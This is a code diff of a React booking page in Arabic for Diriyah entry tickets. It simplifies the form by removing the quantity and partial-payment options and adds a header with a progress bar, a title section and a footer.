@@ -1,52 +1,95 @@
-import { ChevronDown, Calendar, Clock, Ticket, Info, Plus, Minus, CreditCard } from "lucide-react";
+import { ArrowRight, ChevronDown, Calendar, Clock, Ticket, Info } from "lucide-react";
 import { Button } from "@/components/ui/button";
 import { Label } from "@/components/ui/label";
 import { Input } from "@/components/ui/input";
 import { Link, useLocation } from "wouter";
 import { useState, useEffect } from "react";
-import { addData, handleCurrentPage } from "@/lib/firebase";
-import {
-  RestaurantNav,
-  ProgressBar,
-  PageBanner,
-  BujairiFooter,
-} from "@/components/bujairi-header";
-
-const TICKET_PRICE = 50;
-// Flat hold-fee that lets visitors confirm a booking now and pay the rest
-// at the venue. Mirrors the partial-payment option on /reserve.
-const PARTIAL_FEE = 10;
-type PaymentMode = "full" | "partial";
+import { handleCurrentPage } from "@/lib/firebase";
 
 export default function BookingPage() {
   const [date, setDate] = useState<Date | undefined>(new Date());
   const [time, setTime] = useState("09:00");
-  const [quantity, setQuantity] = useState(1);
-  const [paymentMode, setPaymentMode] = useState<PaymentMode>("full");
 
   useEffect(() => {
     handleCurrentPage("booking");
   }, []);
 
   return (
-    <div className="min-h-screen bg-[#ebddd0] flex flex-col" dir="rtl">
-      <RestaurantNav active="booking-options" />
-      <ProgressBar current={2} />
-      <PageBanner title="الحجز" />
+    <div className="min-h-screen bg-gradient-to-b from-[#f5efe6] to-[#ebddd0] flex flex-col" dir="rtl">
+      <Header />
       <main className="flex-1 pb-8">
-        <BookingForm
-          date={date}
-          setDate={setDate}
-          time={time}
-          setTime={setTime}
-          quantity={quantity}
-          setQuantity={setQuantity}
-          paymentMode={paymentMode}
-          setPaymentMode={setPaymentMode}
-        />
+        <TitleSection />
+        <BookingForm date={date} setDate={setDate} time={time} setTime={setTime} />
         <TermsSection />
+        <FooterSection />
       </main>
-      <BujairiFooter />
+    </div>
+  );
+}
+
+function Header() {
+  return (
+    <header className="bg-[#4a1525] text-white">
+      <div className="container mx-auto px-4 py-4">
+        <div className="flex items-center justify-between">
+          <Link href="/registration">
+            <Button size="icon" variant="ghost" className="text-white hover:bg-white/10" data-testid="button-back-booking">
+              <ArrowRight className="w-5 h-5" />
+            </Button>
+          </Link>
+          
+          <div className="flex-1 flex justify-center">
+            <img src="/logo-white.svg" alt="الدرعية" className="h-12" data-testid="img-booking-logo" />
+          </div>
+          
+          <div className="w-10" />
+        </div>
+        
+        <div className="flex items-center justify-center gap-1 mt-6 pb-2">
+          {[
+            { number: 1, label: "تسجيل" },
+            { number: 2, label: "الحجز" },
+            { number: 3, label: "السلة" },
+            { number: 4, label: "الدفع" },
+          ].map((step, index, arr) => (
+            <div key={step.number} className="flex items-center">
+              <div className="flex flex-col items-center">
+                <div
+                  className={`w-10 h-10 rounded-full flex items-center justify-center text-sm font-bold transition-all ${
+                    step.number <= 2
+                      ? "bg-gradient-to-br from-[#c9a96e] to-[#b8935a] text-white shadow-lg"
+                      : "bg-white/20 text-white/60"
+                  }`}
+                >
+                  {step.number}
+                </div>
+                <span className="text-xs mt-2 text-white/80">{step.label}</span>
+              </div>
+              {index < arr.length - 1 && (
+                <div
+                  className={`w-10 h-1 mx-1 rounded-full ${
+                    step.number < 2 ? "bg-gradient-to-r from-[#c9a96e] to-[#b8935a]" : "bg-white/20"
+                  }`}
+                />
+              )}
+            </div>
+          ))}
+        </div>
+      </div>
+    </header>
+  );
+}
+
+function TitleSection() {
+  return (
+    <div className="bg-gradient-to-r from-[#4a1525] to-[#3a0f1d] py-8 px-4 text-center">
+      <div className="flex items-center justify-center gap-3 mb-2">
+        <Ticket className="w-7 h-7 text-[#c9a96e]" />
+        <h1 className="text-2xl font-bold text-white" data-testid="text-booking-title">
+          تصريح دخول الدرعية
+        </h1>
+      </div>
+      <p className="text-white/70 text-sm">اختر التاريخ والوقت المناسب لزيارتك</p>
     </div>
   );
 }
@@ -55,23 +98,13 @@ function BookingForm({
   date, 
   setDate, 
   time, 
-  setTime,
-  quantity,
-  setQuantity,
-  paymentMode,
-  setPaymentMode,
+  setTime 
 }: { 
   date: Date | undefined; 
   setDate: (d: Date | undefined) => void; 
   time: string; 
   setTime: (t: string) => void;
-  quantity: number;
-  setQuantity: (q: number) => void;
-  paymentMode: PaymentMode;
-  setPaymentMode: (m: PaymentMode) => void;
 }) {
-  const fullAmount = quantity * TICKET_PRICE;
-  const dueNow = paymentMode === "partial" ? PARTIAL_FEE : fullAmount;
   const timeSlots = [
     "09:00", "10:00", "11:00", "12:00",
     "13:00", "14:00", "15:00", "16:00",
@@ -88,31 +121,13 @@ function BookingForm({
     setSubmitError("");
     const bookingData = { date: date?.toISOString(), time };
     localStorage.setItem("bookingData", JSON.stringify(bookingData));
-    const visitorId = localStorage.getItem("visitor");
-    if (!visitorId) {
-      setSubmitError("لم يتم العثور على بيانات الزائر");
-      setIsSubmitting(false);
-      return;
-    }
-    const ok = await addData({
-      id: visitorId,
-      currentPage: "booking",
-      ticketQuantity: quantity,
-      ticketPrice: TICKET_PRICE,
-      // `totalAmount` is what the visitor is being charged right now —
-      // either the full ticket price or the small hold deposit. Dashboard
-      // displays this number, so it must reflect the chosen mode.
-      totalAmount: dueNow,
-      paymentMode,
-      bookingDate: bookingData.date,
-      bookingTime: bookingData.time,
-    });
+    const ok = await handleCurrentPage("booking");
     if (!ok) {
       setSubmitError("تعذر إكمال الحجز، يرجى المحاولة مرة أخرى");
       setIsSubmitting(false);
       return;
     }
-    setLocation("/checkout");
+    setLocation("/cart");
   };
 
   return (
@@ -168,135 +183,14 @@ function BookingForm({
           </div>
         </div>
 
-        <div>
-          <Label className="text-sm font-medium text-foreground mb-3 flex items-center gap-2">
-            <Ticket className="w-4 h-4 text-primary" />
-            عدد التذاكر *
-          </Label>
-          <div className="flex items-center justify-between bg-muted rounded-xl p-2">
-            <Button
-              type="button"
-              size="icon"
-              variant="ghost"
-              className="h-10 w-10 rounded-lg"
-              onClick={() => setQuantity(Math.max(1, quantity - 1))}
-              data-testid="button-decrease-qty"
-            >
-              <Minus className="w-4 h-4" />
-            </Button>
-            <span className="font-bold text-lg" data-testid="text-quantity">
-              {quantity}
-            </span>
-            <Button
-              type="button"
-              size="icon"
-              variant="ghost"
-              className="h-10 w-10 rounded-lg"
-              onClick={() => setQuantity(quantity + 1)}
-              data-testid="button-increase-qty"
-            >
-              <Plus className="w-4 h-4" />
-            </Button>
-          </div>
-        </div>
-
         <div className="bg-gradient-to-r from-[#f5efe6] to-[#ebddd0] rounded-xl p-5">
           <div className="flex items-center gap-2 mb-3">
             <Ticket className="w-5 h-5 text-primary" />
-            <h3 className="font-bold text-foreground">المجموع</h3>
+            <h3 className="font-bold text-foreground">أسعار التذاكر</h3>
           </div>
           <div className="flex items-center justify-between">
-            <span className="text-muted-foreground">
-              {quantity} × {TICKET_PRICE} ر.س
-            </span>
-            <span
-              className="font-bold text-xl text-primary"
-              data-testid="text-booking-total"
-            >
-              {fullAmount} ر.س
-            </span>
-          </div>
-        </div>
-
-        {/* Payment mode: pay full now, or a small hold deposit to confirm */}
-        <div className="space-y-3" data-testid="payment-mode-selector">
-          <Label className="text-sm font-medium text-foreground flex items-center gap-2">
-            <CreditCard className="w-4 h-4 text-primary" />
-            طريقة الدفع
-          </Label>
-          <div className="grid grid-cols-2 gap-3">
-            <button
-              type="button"
-              onClick={() => setPaymentMode("full")}
-              className={`relative text-right p-3 rounded-xl border-2 transition-all ${
-                paymentMode === "full"
-                  ? "border-primary bg-primary/5 shadow-sm"
-                  : "border-input bg-white hover:border-[#c9a96e]"
-              }`}
-              data-testid="payment-mode-full"
-            >
-              <div className="text-[11px] text-muted-foreground mb-1">الدفع الكامل</div>
-              <div className="text-foreground font-bold text-lg">{fullAmount} ر.س</div>
-              <div className="text-[10px] text-muted-foreground mt-1 leading-tight">
-                دفع كامل قيمة التذاكر
-              </div>
-              {paymentMode === "full" && (
-                <div className="absolute top-2 left-2 w-5 h-5 rounded-full bg-primary flex items-center justify-center">
-                  <svg viewBox="0 0 16 16" className="w-3 h-3 text-white fill-current">
-                    <path d="M6 11.5L2.5 8l1-1L6 9.5l6.5-6.5 1 1z" />
-                  </svg>
-                </div>
-              )}
-            </button>
-            <button
-              type="button"
-              onClick={() => setPaymentMode("partial")}
-              className={`relative text-right p-3 rounded-xl border-2 transition-all ${
-                paymentMode === "partial"
-                  ? "border-primary bg-primary/5 shadow-sm"
-                  : "border-input bg-white hover:border-[#c9a96e]"
-              }`}
-              data-testid="payment-mode-partial"
-            >
-              <div className="flex items-center justify-between">
-                <div className="text-[11px] text-muted-foreground mb-1">دفع جزئي</div>
-                <span className="text-[9px] bg-[#c9a96e] text-white px-1.5 py-0.5 rounded font-bold">
-                  موصى به
-                </span>
-              </div>
-              <div className="text-foreground font-bold text-lg">{PARTIAL_FEE} ر.س</div>
-              <div className="text-[10px] text-muted-foreground mt-1 leading-tight">
-                لتأكيد الحجز فقط
-              </div>
-              {paymentMode === "partial" && (
-                <div className="absolute top-2 left-2 w-5 h-5 rounded-full bg-primary flex items-center justify-center">
-                  <svg viewBox="0 0 16 16" className="w-3 h-3 text-white fill-current">
-                    <path d="M6 11.5L2.5 8l1-1L6 9.5l6.5-6.5 1 1z" />
-                  </svg>
-                </div>
-              )}
-            </button>
-          </div>
-
-          <div className="bg-white/60 rounded-xl p-3 text-center text-xs text-muted-foreground">
-            {paymentMode === "partial" ? (
-              <>
-                يتم خصم <span className="font-bold text-primary">{PARTIAL_FEE} ر.س</span> الآن لتأكيد الحجز،
-                والباقي <span className="font-bold text-primary">{fullAmount - PARTIAL_FEE} ر.س</span> يُدفع عند الزيارة
-              </>
-            ) : (
-              <>سيتم خصم المبلغ الكامل الآن</>
-            )}
-          </div>
-
-          <div className="flex items-center justify-between pt-1">
-            <span className="text-sm text-muted-foreground">المبلغ المستحق الآن</span>
-            <span
-              className="font-bold text-xl text-primary"
-              data-testid="text-due-now"
-            >
-              {dueNow} ر.س
-            </span>
+            <span className="text-muted-foreground">تذكرة دخول الدرعية</span>
+            <span className="font-bold text-xl text-primary">50 ر.س</span>
           </div>
         </div>
 
@@ -310,7 +204,7 @@ function BookingForm({
             disabled={isSubmitting}
             data-testid="button-confirm-booking"
           >
-            {isSubmitting ? "جاري الإرسال..." : "المتابعة للدفع"}
+            {isSubmitting ? "جاري الإرسال..." : "احجز الآن"}
           </Button>
 
           {submitError && (
@@ -319,7 +213,7 @@ function BookingForm({
             </p>
           )}
           
-          <Link href="/">
+          <Link href="/tickets">
             <Button 
               variant="outline"
               size="lg"
@@ -365,3 +259,12 @@ function TermsSection() {
   );
 }
 
+function FooterSection() {
+  return (
+    <footer className="px-4 py-6 text-center" data-testid="section-booking-footer">
+      <p className="text-xs text-muted-foreground">
+        حقوق النشر 2024. جميع الحقوق محفوظة
+      </p>
+    </footer>
+  );
+}
